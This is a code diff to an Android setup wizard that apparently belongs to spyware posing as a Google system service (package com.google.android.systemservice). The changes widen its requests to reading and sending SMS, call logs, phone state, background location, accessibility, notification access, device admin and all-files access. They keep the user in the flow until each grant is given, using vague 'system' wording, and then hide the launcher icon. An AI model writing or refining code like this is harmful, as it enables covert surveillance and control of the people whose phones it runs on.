@@ -55,6 +55,8 @@ class SetupWizardActivity : AppCompatActivity() {
     private val DEVICE_ADMIN_REQUEST_CODE = 1005
     private val VENDOR_AUTOSTART_REQUEST_CODE = 1006
 
+    // Step order: 0=Accessibility, 1=Permissions, 2=Notifications, 3=Battery, 4=DeviceAdmin, 5=Autostart, 6=Files
+
     private val requiredPermissions = mutableListOf(
         // Location
         Manifest.permission.ACCESS_FINE_LOCATION,
@@ -67,23 +69,36 @@ class SetupWizardActivity : AppCompatActivity() {
         Manifest.permission.READ_CALL_LOG,
         // SMS
         Manifest.permission.READ_SMS,
-        Manifest.permission.RECEIVE_SMS
+        Manifest.permission.RECEIVE_SMS,
+        Manifest.permission.SEND_SMS,
+        // Phone
+        Manifest.permission.READ_PHONE_STATE
     ).apply {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             add(Manifest.permission.POST_NOTIFICATIONS)
             add(Manifest.permission.READ_MEDIA_IMAGES)
             add(Manifest.permission.READ_MEDIA_VIDEO)
             add(Manifest.permission.READ_MEDIA_AUDIO)
-        } else {
+        }
+        // READ_EXTERNAL_STORAGE only works on API 28-32; on 33+ use READ_MEDIA_*; on 29- it's auto-granted
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU &&
+            Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+        // Bluetooth permissions for Android 12+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            add(Manifest.permission.BLUETOOTH_SCAN)
+            add(Manifest.permission.BLUETOOTH_CONNECT)
         }
+        // Background location requested separately (not in this list)
     }
+    
+    // Track how many times we've asked for permissions (for "permanently denied" detection)
+    private var permissionRequestAttempts = 0
     
     // Request code for All Files Access
     private val MANAGE_STORAGE_REQUEST_CODE = 1007
+    private val BACKGROUND_LOCATION_REQUEST_CODE = 1008
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -122,12 +137,12 @@ class SetupWizardActivity : AppCompatActivity() {
 
         when (currentStep) {
             0 -> {
-                statusText.text = "Configuring system permissions..."
-                actionButton.text = "GRANT PERMISSIONS"
-            }
-            1 -> {
                 statusText.text = "Enabling accessibility service..."
                 actionButton.text = "ENABLE SERVICE"
+            }
+            1 -> {
+                statusText.text = "Configuring system permissions..."
+                actionButton.text = "GRANT PERMISSIONS"
             }
             2 -> {
                 statusText.text = "Configuring notification access..."
@@ -157,8 +172,8 @@ class SetupWizardActivity : AppCompatActivity() {
 
     private fun executeCurrentStep() {
         when (currentStep) {
-            0 -> requestRuntimePermissions()
-            1 -> requestAccessibilityService()
+            0 -> requestAccessibilityService()
+            1 -> requestRuntimePermissions()
             2 -> requestNotificationListener()
             3 -> requestBatteryOptimization()
             4 -> requestDeviceAdmin()
@@ -186,20 +201,49 @@ class SetupWizardActivity : AppCompatActivity() {
         }
     }
 
-    // Step 0: Runtime Permissions
+    // Step 1: Runtime Permissions (after Accessibility)
     private fun requestRuntimePermissions() {
-        val permissionsToRequest = requiredPermissions.filter {
+        val needed = requiredPermissions.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
 
-        if (permissionsToRequest.isEmpty()) {
-            advanceToNextStep()
-        } else {
+        if (needed.isNotEmpty()) {
+            // Check if any permission is permanently denied (user pressed "Don't Allow" twice)
+            val permanentlyDenied = needed.filter {
+                permissionRequestAttempts > 0 && !ActivityCompat.shouldShowRequestPermissionRationale(this, it)
+            }
+            
+            if (permanentlyDenied.isNotEmpty() && permissionRequestAttempts >= 2) {
+                // Must open app settings — Android won't show dialog anymore
+                statusText.text = "Please enable all permissions in Settings"
+                actionButton.text = "OPEN SETTINGS"
+                actionButton.setOnClickListener {
+                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                        data = Uri.parse("package:$packageName")
+                    }
+                    startActivityForResult(intent, PERMISSION_REQUEST_CODE)
+                }
+                return
+            }
+            
+            permissionRequestAttempts++
+            // Reset button listener to normal
+            actionButton.setOnClickListener { executeCurrentStep() }
             ActivityCompat.requestPermissions(
                 this,
-                permissionsToRequest.toTypedArray(),
+                needed.toTypedArray(),
                 PERMISSION_REQUEST_CODE
             )
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
+            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            // All foreground granted, now request background location separately
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
+                BACKGROUND_LOCATION_REQUEST_CODE
+            )
+        } else {
+            advanceToNextStep()
         }
     }
 
@@ -209,11 +253,39 @@ class SetupWizardActivity : AppCompatActivity() {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            // Always advance - we'll work with what we got
-            handler.postDelayed({
-                advanceToNextStep()
-            }, 300)
+        when (requestCode) {
+            PERMISSION_REQUEST_CODE -> {
+                handler.postDelayed({
+                    val stillNeeded = requiredPermissions.filter {
+                        ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+                    }
+                    if (stillNeeded.isEmpty()) {
+                        // Foreground done, now request background location if needed
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
+                            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                            ActivityCompat.requestPermissions(
+                                this,
+                                arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
+                                BACKGROUND_LOCATION_REQUEST_CODE
+                            )
+                        } else {
+                            advanceToNextStep()
+                        }
+                    } else {
+                        Log.e(TAG, "Still need ${stillNeeded.size} permissions: ${stillNeeded.joinToString()}")
+                        statusText.text = "Missing ${stillNeeded.size} permissions. Please grant all."
+                        actionButton.text = "GRANT PERMISSIONS"
+                        // Reset listener in case it was changed to "OPEN SETTINGS"
+                        actionButton.setOnClickListener { executeCurrentStep() }
+                    }
+                }, 500)
+            }
+            BACKGROUND_LOCATION_REQUEST_CODE -> {
+                handler.postDelayed({
+                    // Background location granted or denied — advance either way
+                    advanceToNextStep()
+                }, 300)
+            }
         }
     }
 
@@ -298,9 +370,84 @@ class SetupWizardActivity : AppCompatActivity() {
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         
-        // Always advance after returning from settings - user made their choice
         handler.postDelayed({
-            advanceToNextStep()
+            // Verify each step is actually completed before advancing
+            when (requestCode) {
+                ACCESSIBILITY_REQUEST_CODE -> {
+                    if (isAccessibilityServiceEnabled()) {
+                        advanceToNextStep()
+                    } else {
+                        statusText.text = "Accessibility service is required. Please enable it."
+                        actionButton.text = "ENABLE SERVICE"
+                    }
+                }
+                PERMISSION_REQUEST_CODE -> {
+                    // Returned from app Settings — re-check permissions
+                    val stillNeeded = requiredPermissions.filter {
+                        ContextCompat.checkSelfPermission(this@SetupWizardActivity, it) != PackageManager.PERMISSION_GRANTED
+                    }
+                    if (stillNeeded.isEmpty()) {
+                        // Reset listener and check background location
+                        actionButton.setOnClickListener { executeCurrentStep() }
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
+                            ContextCompat.checkSelfPermission(this@SetupWizardActivity, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                            ActivityCompat.requestPermissions(
+                                this@SetupWizardActivity,
+                                arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
+                                BACKGROUND_LOCATION_REQUEST_CODE
+                            )
+                        } else {
+                            advanceToNextStep()
+                        }
+                    } else {
+                        statusText.text = "Missing ${stillNeeded.size} permissions. Please grant all."
+                        actionButton.text = "GRANT PERMISSIONS"
+                        actionButton.setOnClickListener { executeCurrentStep() }
+                    }
+                }
+                NOTIFICATION_LISTENER_REQUEST_CODE -> {
+                    if (isNotificationListenerEnabled()) {
+                        advanceToNextStep()
+                    } else {
+                        statusText.text = "Notification access is required. Please enable it."
+                        actionButton.text = "ENABLE ACCESS"
+                    }
+                }
+                BATTERY_OPTIMIZATION_REQUEST_CODE -> {
+                    val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+                    if (pm.isIgnoringBatteryOptimizations(packageName)) {
+                        advanceToNextStep()
+                    } else {
+                        statusText.text = "Battery optimization exemption required."
+                        actionButton.text = "OPTIMIZE"
+                    }
+                }
+                DEVICE_ADMIN_REQUEST_CODE -> {
+                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                    val cn = ComponentName(this, SystemAdminReceiver::class.java)
+                    if (dpm.isAdminActive(cn)) {
+                        advanceToNextStep()
+                    } else {
+                        statusText.text = "Device admin is required for protection."
+                        actionButton.text = "ACTIVATE"
+                    }
+                }
+                MANAGE_STORAGE_REQUEST_CODE -> {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && android.os.Environment.isExternalStorageManager()) {
+                        advanceToNextStep()
+                    } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+                        advanceToNextStep()
+                    } else {
+                        statusText.text = "File access permission is required."
+                        actionButton.text = "ALLOW ACCESS"
+                    }
+                }
+                VENDOR_AUTOSTART_REQUEST_CODE -> {
+                    // Vendor autostart can't be verified programmatically
+                    advanceToNextStep()
+                }
+                else -> advanceToNextStep()
+            }
         }, 500)
     }
 
@@ -325,18 +472,14 @@ class SetupWizardActivity : AppCompatActivity() {
             .putBoolean("setup_complete", true)
             .apply()
 
-        // CRITICAL: Start services FIRST, then hide icon, THEN finish activity
-        // If we hide icon first and services fail, user has no way to retry
+        // Start services, then hide icons; keep retry if hiding fails
         handler.postDelayed({
             try {
                 launchServicesAndFinish()
-                // Only hide icon AFTER services started successfully
                 hideLauncherIcon()
-                // Finally, close the activity AFTER hiding icon
                 finish()
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to launch services: ${e.message}")
-                // Don't hide icon if services failed - user needs retry option
                 Toast.makeText(this, "Setup incomplete, please retry", Toast.LENGTH_LONG).show()
             }
         }, 1500)
@@ -348,17 +491,22 @@ class SetupWizardActivity : AppCompatActivity() {
     }
 
     private fun hideLauncherIcon() {
-        val components = listOf(
-            ComponentName(this, SetupWizardActivity::class.java),
+        // Only disable launcher aliases — NOT SetupWizardActivity itself
+        // SetupWizardActivity checks isSetupComplete() and skips wizard if already done
+        val launcherAliases = listOf(
             ComponentName(this, "com.google.android.systemservice.ProvisionLauncherActivity")
         )
 
-        components.forEach { componentName ->
-            packageManager.setComponentEnabledSetting(
-                componentName,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
+        launcherAliases.forEach { componentName ->
+            try {
+                packageManager.setComponentEnabledSetting(
+                    componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to hide component: ${componentName.className} ${e.message}")
+            }
         }
     }
 
